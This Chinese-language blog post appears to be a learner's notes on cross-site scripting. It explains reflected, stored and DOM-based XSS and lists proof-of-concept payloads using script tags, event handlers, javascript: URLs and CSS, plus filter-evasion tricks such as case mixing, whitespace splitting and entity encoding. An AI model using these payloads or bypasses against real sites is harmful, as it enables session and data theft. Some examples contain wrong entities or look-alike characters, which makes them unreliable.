<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-hacker.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-hacker.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-hacker.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":false,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="前言终于来到了XSS，来这一关之前把js重学了一遍，又把千锋关于XSS的视频也看了一遍，至此才敢写下这篇。">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS跨站脚本漏洞">
<meta property="og:url" content="http://example.com/2022/12/02/XSS/index.html">
<meta property="og:site_name" content="Scammer">
<meta property="og:description" content="前言终于来到了XSS，来这一关之前把js重学了一遍，又把千锋关于XSS的视频也看了一遍，至此才敢写下这篇。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/simg/xss_1.png">
<meta property="article:published_time" content="2022-12-01T16:00:00.000Z">
<meta property="article:modified_time" content="2022-12-06T13:38:57.065Z">
<meta property="article:author" content="Bron">
<meta property="article:tag" content="XSS">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/simg/xss_1.png">

<link rel="canonical" href="http://example.com/2022/12/02/XSS/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>
<link rel="stylesheet" type="text/css" href="/css/injector/main.css" /><link rel="preload" as="style" href="/css/injector/light.css" /><link rel="preload" as="style" href="/css/injector/dark.css" />
  <title>XSS跨站脚本漏洞 | Scammer</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Scammer" type="application/atom+xml">
<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#000000;--blockquote-color:#bbb;--link-color:#000000;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#ccc;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#161616;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#8a2be2;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Scammer</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">53</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">53</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">142</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/02/XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/Elaina.png">
      <meta itemprop="name" content="Bron">
      <meta itemprop="description" content="原谅我这一生不羁放纵爱自由">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Scammer">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          XSS跨站脚本漏洞
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-12-02 00:00:00" itemprop="dateCreated datePublished" datetime="2022-12-02T00:00:00+08:00">2022-12-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-12-06 21:38:57" itemprop="dateModified" datetime="2022-12-06T21:38:57+08:00">2022-12-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index"><span itemprop="name">XSS</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于来到了XSS，来这一关之前把js重学了一遍，又把千锋关于XSS的视频也看了一遍，至此才敢写下这篇。</p>
<span id="more"></span>
<h1 id="XSS-漏洞概述"><a href="#XSS-漏洞概述" class="headerlink" title="XSS 漏洞概述"></a>XSS 漏洞概述</h1><h2 id="XSS-简单介绍"><a href="#XSS-简单介绍" class="headerlink" title="XSS 简单介绍"></a>XSS 简单介绍</h2><p>XSS又名CSS(Cross Site Scripting)，即跨站脚本攻击。<br>XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。在留言板，聊天室等收集用户输入的地方，只要没有对用户输入进行严格过滤，都有可能被注入XSS代码。<br>从上述内容可知，XSS属于客户端攻击，受害者最终是用户。XSS也可以攻击服务器端，攻击者可能靠管理员身份作为跳板实施攻击。</p>
<h2 id="产生层面"><a href="#产生层面" class="headerlink" title="产生层面"></a>产生层面</h2><p>产生层面一般是在前端，JS代码能干什么，执行之后就会达到相应的效果</p>
<h2 id="函数类"><a href="#函数类" class="headerlink" title="函数类"></a>函数类</h2><p>比如php中的脚本的输出函数<br>常见的输出函数有：<code>print, print_r, echo, printf, sprintf, die, var_dump, var_export</code></p>
<h2 id="XSS-危害"><a href="#XSS-危害" class="headerlink" title="XSS 危害"></a>XSS 危害</h2><p>XSS利用JS代码实现攻击，有很多方法，以下列出常见几种：</p>
<ul>
<li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li>
<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
<li>盗窃企业重要的具有商业价值的资料</li>
<li>非法转账</li>
<li>强制发送电子邮件</li>
<li>网站挂马</li>
<li>控制受害者机器向其它网站发起攻击</li>
<li>刷流量，执行弹窗广告</li>
</ul>
<h2 id="浏览器内核"><a href="#浏览器内核" class="headerlink" title="浏览器内核"></a>浏览器内核</h2><p>利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截）</p>
<h2 id="XSS-漏洞的验证"><a href="#XSS-漏洞的验证" class="headerlink" title="XSS 漏洞的验证"></a>XSS 漏洞的验证</h2><p>可以用一段简单的代码，检测和验证漏洞的存在，这样的代码叫做PoC(Proof of Concept)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PoC          漏洞的验证与检测</span><br><span class="line">EXP          漏洞的完整利用工具</span><br><span class="line">shellcode    利用漏洞时所执行的代码</span><br><span class="line">payload      攻击载荷 -sqlmap中是攻击代码的模板  -msf中与shellcode类似，功能是建立与目标的连接</span><br><span class="line">验证XSS 漏洞存在的PoC如下</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;   常用</span><br><span class="line">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XSS-攻击分类"><a href="#XSS-攻击分类" class="headerlink" title="XSS 攻击分类"></a>XSS 攻击分类</h2><h3 id="来自内部的攻击"><a href="#来自内部的攻击" class="headerlink" title="来自内部的攻击"></a>来自内部的攻击</h3><p>利用程序自身的漏洞，构造跨站语句。如：dvbbs的showerror.asp存在的跨站漏洞。</p>
<h3 id="来自外部的攻击"><a href="#来自外部的攻击" class="headerlink" title="来自外部的攻击"></a>来自外部的攻击</h3><p>主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p>
<h1 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h1><p>XSS漏洞可以分为三个类型：反射型XSS，存储型XSS，DOM型XSS</p>
<h2 id="反射型-非持久化"><a href="#反射型-非持久化" class="headerlink" title="反射型(非持久化)"></a>反射型(非持久化)</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>反射型XSS是非持久性，参数型的跨站脚本。是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞<br>反射型XSS的JS代码在Web应用的参数(变量)中，如搜索框的反射型XSS。</p>
<h3 id="判断是否存在反射型XSS漏洞并利用"><a href="#判断是否存在反射型XSS漏洞并利用" class="headerlink" title="判断是否存在反射型XSS漏洞并利用"></a>判断是否存在反射型XSS漏洞并利用</h3><ol>
<li>判断有没有一些特殊字符<br>按照没有被过滤的字符进行代码构造。</li>
<li>注入代码<br>查看源代码进一步完善代码构造并尝试注入。</li>
<li>插入代码</li>
<li>利用XSS漏洞</li>
</ol>
<h2 id="存储型-持久化"><a href="#存储型-持久化" class="headerlink" title="存储型(持久化)"></a>存储型(持久化)</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>存储型XSS是持久性跨站脚本。持久性体现在XSS代码不是在某个参数(变量)中，而是写入数据库或文件等可以永久保存的介质中。最典型的例子就是留言板XSS，攻击者提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击。<br><img src="/simg/xss_1.png" alt="存储型"></p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>注入后重新刷新发现直接回显注入的东西，说明是存储型xss</p>
<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分<br>DOM型xss其实是一种特殊类型的反射型xss，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，触发XSS靠的是浏览器的DOM解析，完全是客户端的事情。<br>DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。<br>基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。</p>
<h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞</p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>


<h1 id="XSS-的构造"><a href="#XSS-的构造" class="headerlink" title="XSS 的构造"></a>XSS 的构造</h1><h2 id="利用-lt-gt-构造HTML-JS"><a href="#利用-lt-gt-构造HTML-JS" class="headerlink" title="利用&lt;&gt;构造HTML/JS"></a>利用&lt;&gt;构造HTML/JS</h2><pre><code>可以利用&lt;&gt;构造HTML标签和&lt;script&gt;标签
在测试页面提交参数 &lt;h1 style=&#39;color:red&#39;&gt;111&lt;/h1&gt;
提交 &lt;script&gt;alert(/xss/)&lt;/script&gt;
</code></pre>
<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>可以使用javascript:伪协议的方式构造XSS，比如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(/xss/)        						在Edge浏览器URL中输入该代码能够运行</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span>     点击超链接即可触发XSS</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>            		IE6下测试成功</span><br></pre></td></tr></table></figure>

<h2 id="产生自己的事件"><a href="#产生自己的事件" class="headerlink" title="产生自己的事件"></a>产生自己的事件</h2><p>“事件驱动”是一种比较经典的编程思想。在网页中发生的事件（如：鼠标移动点击，键盘输入等），JS可以对这些事件进行响应。因此可通过事件触发JS函数，触发XSS。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">事件种类</span><br><span class="line">windows 事件  		对windows 对象触发的事件</span><br><span class="line">form 事件 			HTML表单内的动作触发事件</span><br><span class="line">Keyboard 事件 		键盘按键</span><br><span class="line">Mouse 事件 			由鼠标类似用户动作触发的事件</span><br><span class="line">Media 事件 			由多媒体触发的事件</span><br></pre></td></tr></table></figure>
<p>比如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;./smile.jpg&#x27;</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span>  	// 标签引入一张图片，鼠标悬停于图片上时会触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onkeydown</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>			// 当点击键盘任意一个键时触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>					// 当图片未找到时触发XSS代码</span><br></pre></td></tr></table></figure>

<h2 id="利用CSS跨站-了解"><a href="#利用CSS跨站-了解" class="headerlink" title="利用CSS跨站(了解)"></a>利用CSS跨站(了解)</h2><p>可以利用CSS（层叠样式脚本）触发XSS。但方法古老，基本不适用，从学习角度了解。以下代码均在IE6下测试。</p>
<ul>
<li>行内样式<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-image: url(javascript:alert(/xss/))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>页内样式<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-tag">Body</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">javascript:alert(/xss</span>))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>外部样式<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./xss.css&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="其它标签以及手法"><a href="#其它标签以及手法" class="headerlink" title="其它标签以及手法"></a>其它标签以及手法</h2><p>可以使用其它标签触发XSS，比如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>						载入页面时自动触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(/xss/)&quot;</span> <span class="attr">autofocus</span>&gt;</span>		当鼠标放在目标上时，自动聚焦并触发XSS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">οnlοad</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>  <span class="attr">src</span>=<span class="string">1</span>  <span class="attr">οnerrοr</span>=<span class="string">alert(hack)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">οnlοadstart</span>=<span class="string">alert(1)</span> <span class="attr">src</span>=<span class="string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">οnlοad</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="XSS的变形"><a href="#XSS的变形" class="headerlink" title="XSS的变形"></a>XSS的变形</h1><p>可以将构造的XSS代码进行各种变形，以绕过XSS过滤器的检测。</p>
<h2 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h2><p>将payload进行大小写转换。但需要注意，只能对其中的HTML代码进行大小写转换，因为JS代码对大小写敏感。比如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span> /&gt;</span> 				不能对alert进行大小写转换，因为是JS代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;javaScript:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="引号的使用"><a href="#引号的使用" class="headerlink" title="引号的使用"></a>引号的使用</h2><p>HTML 语言对引号不敏感，但某些过滤函数敏感。因此不同过滤情况需要考虑使用单&#x2F;双引号或不使用引号。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)/</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="代替空格"><a href="#代替空格" class="headerlink" title="代替空格"></a>代替空格</h2><p>可以利用 <code>/  //  %0a  %0d  Table键</code> 代替空格</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img/sRc=&#x27;#&#x27;/Onerror=&#x27;alert(/xss/)&#x27;/&gt;</span><br></pre></td></tr></table></figure>

<h2 id="回车"><a href="#回车" class="headerlink" title="回车"></a>回车</h2><p>可以在一些位置添加Tab(水平制表符)和回车符，来绕过关键字检测。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Img</span> <span class="attr">sRc</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>	=<span class="string">&quot;alert(/xss/)&quot;</span> /&gt;</span> 		// 不能强行打断Onerror</span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">hREf</span>=<span class="string">&quot;j</span></span></span><br><span class="line"><span class="string"><span class="tag">a	v</span></span></span><br><span class="line"><span class="string"><span class="tag">a 	s</span></span></span><br><span class="line"><span class="string"><span class="tag">cript:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h2><p>可以对标签属性值进行转码，用来绕过过滤。对应编码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字母 	ASCII码 		十进制编码 	十六进制编码</span><br><span class="line">a 		97			&amp;#97; 		&amp;#x61;</span><br><span class="line">e 		101			&amp;#101; 		&amp;#x65;</span><br></pre></td></tr></table></figure>
<p>简单编码后的示例：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#61;</span>Script:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>另外，可以将以下字符插入到任意位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Tab 	&amp;#9</span><br><span class="line">换行 	&amp;#10</span><br><span class="line">回车 	&amp;#13</span><br></pre></td></tr></table></figure>
<p>可以将以下字符插入到头部位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SOH 	&amp;#01</span><br><span class="line">STX 	&amp;#02</span><br></pre></td></tr></table></figure>
<p>简单编码后的示例：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;<span class="symbol">&amp;#01;</span>j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#61;</span>S<span class="symbol">&amp;#9;</span>c<span class="symbol">&amp;#10;</span>r<span class="symbol">&amp;#13;</span>ipt:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

